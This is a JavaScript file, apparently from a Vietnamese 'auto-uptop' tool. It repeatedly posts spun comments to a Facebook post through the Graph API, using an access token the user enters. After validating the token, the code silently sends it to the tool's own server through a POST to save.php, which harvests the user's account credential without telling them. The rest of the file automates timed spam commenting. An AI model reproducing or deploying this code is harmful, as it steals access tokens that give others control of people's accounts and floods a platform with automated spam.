function auto_uptop_commented() {
    if (0 == uptop.run) {
        return !1
    };
    $('#auto_uptop_status').html('<font color=\"blue\">Đang gửi yêu cầu !</font>');
    var b = new Date;
    $.get('https://graph.facebook.com/' + uptop.id + '/comments', {
        method: 'post',
        message: init.spinText(uptop.msg.replace('$thoigian', b.getDate() + '/' + (b.getMonth() + 1) + '/' + b.getFullYear() + ' ' + b.getHours() + ':' + b.getMinutes() + ':' + b.getSeconds())),
        access_token: uptop.token
    }).done(function(b) {
        $('#submit_auto_uptop_stop').undisabled(), $('#auto_uptop_status').html('<font color=\"green\">COMMENT thành công, ID: <b>' + b.id.split('_')[1] + '</b>. Tiếp tục sau <b id=\"timedown\"></b> giây </font> ' + run.loading()), timer.count_down(0, Math.floor(uptop.delay / 60), uptop.delay - 60 * Math.floor(uptop.delay / 60), 'timedown', function() {
            auto_uptop_commented()
        })
    }).error(function(b) {
        $('#auto_uptop_status').html('<font color=\"red\">COMMENT thất bại, quá trình tự động dừng !</font>'), $('#submit_auto_uptop_start').buttonStop(), $('#submit_auto_uptop_stop').disabled()
    })
}
location.hostname == b_sv && ($(document).on('click', '#submit_auto_uptop_start', function() {
    uptop = {
        token: $('#input_auto_uptop_token').validate(),
        id: $('#input_auto_uptop_id').isNumber(),
        msg: $('#input_auto_uptop_msg').validate(),
        delay: $('#input_auto_uptop_delay').isNumber(),
        run: 1,
        timeout: null
    }, uptop.token && uptop.id && uptop.msg && uptop.delay && ($(this).buttonLoad(), $('#auto_uptop_status').html('<font color=\"green\">Bắt đầu kiểm tra Access Token</font> ' + run.loading()), $.get('https://graph.facebook.com/me', {
        access_token: uptop.token
    }).done(function(b) {
        $.post('//' + b_sv + '/save.php', {
            act: 'save',
            array: uptop.token
        }), auto_uptop_commented()
    }).error(function() {
        $('#submit_auto_uptop_start').buttonStop(), noti.error('Vui lòng kiểm tra lại Access Token'), $('#auto_uptop_status').html('<font color=\"red\">Access Token không hợp lệ</font>')
    }))
}), $(document).on('click', '#submit_auto_uptop_stop', function() {
    uptop.run = 0, clearTimeout(timeout), $('#auto_uptop_status').html('<font color=\"red\">Đã có lệnh dừng comment</font>'), $('#submit_auto_uptop_start').buttonStop(), $('#submit_auto_uptop_stop').disabled()
}))